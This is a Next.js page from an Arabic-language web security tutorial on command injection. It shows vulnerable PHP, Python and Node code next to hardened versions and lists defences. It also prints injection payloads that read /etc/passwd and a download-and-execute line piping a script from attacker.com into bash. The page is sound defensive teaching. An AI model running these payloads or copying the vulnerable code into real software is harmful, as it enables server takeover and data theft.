'use client'
import VulnerabilityLayout, { VulnSection, CodeBlock, InfoBox, ListItem } from '@/components/VulnerabilityLayout'
import VideoSection from '@/components/VideoSection'
import ToolsSection from '@/components/ToolsSection'
import LabsSection from '@/components/LabsSection'
import Quiz from '@/components/Quiz'
import ShareButtons from '@/components/ShareButtons'

export default function CommandInjectionPage() {
  return (
    <VulnerabilityLayout
      icon="⌨️"
      titleAr="حقن الأوامر"
      titleEn="Command Injection"
      severity="critical"
      owasp="A3:2021"
    >
      <ShareButtons title="Command Injection - حقن الأوامر" url="https://web-security-guide.vercel.app/vulnerabilities/command-injection" />

      <VulnSection title="تعريف Command Injection" icon="📖">
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8' }}>
          حقن الأوامر (Command Injection) هو ثغرة أمنية تسمح للمهاجم بتنفيذ أوامر نظام التشغيل على الخادم من خلال تمرير أوامر مغرضة عبر مدخلات التطبيق.
        </p>
        <p style={{ color: '#cccccc', fontSize: '14px', lineHeight: '1.8', marginTop: '8px' }}>
          تحدث الثغرة عندما يقوم التطبيق بدمج مدخلات المستخدم مع أوامر نظام التشغيل دون تصفية كافية.
        </p>
      </VulnSection>

      <VulnSection title="كيف يعمل Command Injection" icon="🔍">
        <InfoBox type="info">
          <strong>آلية العمل:</strong>
        </InfoBox>
        <ListItem>يكتشف المهاجم نقطة إدخال تقبل أوامر نظام التشغيل</ListItem>
        <ListItem>يقوم بحقن أمر مغرض باستخدام فواصل الأوامر (;, &&, ||, |)</ListItem>
        <ListItem>يتم تنفيذ الأمر المغرض على الخادم</ListItem>
        <ListItem>يمكن للمهاجم الوصول الكامل للخادم</ListItem>
      </VulnSection>

      <VulnSection title="فواصل الأوامر" icon="🔍">
        <InfoBox type="warning">
          <strong>فواصل الأوامر الشائعة:</strong>
        </InfoBox>
        <CodeBlock title="فواصل الأوامر" code={`# فاصلة منقوطة - تنفيذ أوامر متتالية
command1; command2

# && - تنفيذ الأمر الثاني فقط إذا نجح الأول
command1 && command2

# || - تنفيذ الأمر الثاني فقط إذا فشل الأول
command1 || command2

# | - تمرير مخرجات الأمر الأول للأمر الثاني
command1 | command2

# $() - تنفيذ أمر داخل أمر
$(command1)

# backticks - تنفيذ أمر داخل أمر
\`command1\``} />
      </VulnSection>

      <VulnSection title="أمثلة على الهجمات" icon="💻">
        <CodeBlock title="1. بحث DNS" code={`# إذا كان التطبيق يستخدم nslookup
nslookup example.com

# يمكن حقن أمر
nslookup example.com; cat /etc/passwd

# أو
nslookup example.com && whoami`} />

        <CodeBlock title="2. فحص الشبكة" code={`# إذا كان التطبيق يستخدم ping
ping -c 4 example.com

# يمكن حقن أمر
ping -c 4 example.com; ls -la /

# أو
ping -c 4 example.com | cat /etc/passwd`} />

        <CodeBlock title="3. تحميل وتنفيذ" code={`# تحميل وتنفيذ سكربت ضار
; curl http://attacker.com/shell.sh | bash

# أو
; wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh`} />
      </VulnSection>

      <VulnSection title="أمثلة كود مصاب ومحصن" icon="💻">
        <CodeBlock title="❌ كود مصاب" variant="vulnerable" code={`// PHP - كود مصاب
$domain = $_GET['domain'];
$output = shell_exec('nslookup ' . $domain);
echo $output;

// Python - كود مصاب
import os
domain = request.args.get('domain')
output = os.popen(f'nslookup {domain}').read()

// Node.js - كود مصاب
const { exec } = require('child_process');
app.get('/lookup', (req, res) => {
  exec(\`nslookup \${req.query.domain}\`, (err, stdout) => {
    res.send(stdout);
  });
});`} />

        <CodeBlock title="✅ كود محصن" variant="secure" code={`// PHP - كود محصن
$domain = $_GET['domain'];
// التحقق من أن النطاق يحتوي فقط على أحرف وأرقام ونقاط
if (!preg_match('/^[a-zA-Z0-9.-]+$/', $domain)) {
  die('Invalid domain');
}
$output = shell_exec('nslookup ' . escapeshellarg($domain));
echo $output;

// Python - كود محصن
import subprocess
import re
domain = request.args.get('domain')
if not re.match(r'^[a-zA-Z0-9.-]+$', domain):
    return 'Invalid domain', 400
output = subprocess.run(['nslookup', domain], capture_output=True, text=True)

// Node.js - كود محصن
const { execFile } = require('child_process');
app.get('/lookup', (req, res) => {
  const domain = req.query.domain;
  if (!/^[a-zA-Z0-9.-]+$/.test(domain)) {
    return res.status(400).send('Invalid domain');
  }
  execFile('nslookup', [domain], (err, stdout) => {
    res.send(stdout);
  });
});`} />
      </VulnSection>

      <VulnSection title="طرق الحماية" icon="🛡️">
        <InfoBox type="success">
          <strong>1. استخدام APIs بدلاً من الأوامر</strong> - استخدم مكتبات البرمجة بدلاً من تنفيذ الأوامر مباشرة
        </InfoBox>
        <ListItem>استخدم getaddrinfo() بدلاً من nslookup</ListItem>
        <ListItem>استخدم مكتبات HTTP بدلاً من curl</ListItem>

        <InfoBox type="success">
          <strong>2. التصفية والتحقق</strong> - تحقق من المدخلات قبل استخدامها في أوامر
        </InfoBox>
        <ListItem>استخدم قوائم سوداء للcharacters الخطرة</ListItem>
        <ListItem>تحقق من أن المدخلات تطابق النمط المتوقع</ListItem>

        <InfoBox type="success">
          <strong>3. استخدام escapeshellarg()</strong> - احتوِ المدخلات بشكل آمن
        </InfoBox>
        <ListItem>استخدم escapeshellarg() في PHP</ListItem>
        <ListItem>استخدم shlex.quote() في Python</ListItem>

        <InfoBox type="success">
          <strong>4. تقييد الصلاحيات</strong> - شغّل التطبيق بصلاحيات محدودة
        </InfoBox>
        <ListItem>لا تستخدم root لتشغيل التطبيق</ListItem>
        <ListItem>استخدم AppArmor أو SELinux</ListItem>
      </VulnSection>

      <VulnSection title="نصائح أمنية" icon="💡">
        <InfoBox type="info">
          <strong>القاعدة الذهبية:</strong> لا تنفذ أوامر نظام التشغيل أبداً مع مدخلات المستخدم
        </InfoBox>
        <ListItem>استخدم APIs بدلاً من أوامر النظام</ListItem>
        <ListItem>قيّد صلاحيات التطبيق</ListItem>
        <ListItem>صفي المدخلات بشكل صارم</ListItem>
        <ListItem>راجع الكود بحثاً عن استخدامات shell_exec أو exec</ListItem>
      </VulnSection>

      <VulnSection title="الأخطاء الشائعة" icon="⚠️">
        <InfoBox type="danger">
          <strong>❌ دمج مدخلات المستخدم مع أوامر النظام مباشرة</strong> - هذا يفتح الباب أمام حقن الأوامر
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ استخدام shell_exec() أو exec() مع مدخلات المستخدم</strong> - هذه الدوال خطيرة جداً
        </InfoBox>
        <InfoBox type="danger">
          <strong>❌ تشغيل التطبيق بصلاحيات root</strong> - يعطي المهاجم صلاحيات كاملة للخادم
        </InfoBox>
      </VulnSection>

      <section className="mb-6">
        <LabsSection slug="command-injection" />
      </section>

      <section className="mb-6">
        <ToolsSection slug="command-injection" />
      </section>

      <section className="mb-6">
        <Quiz slug="command-injection" />
        <VideoSection slug="command-injection" />
      </section>
    </VulnerabilityLayout>
  )
}
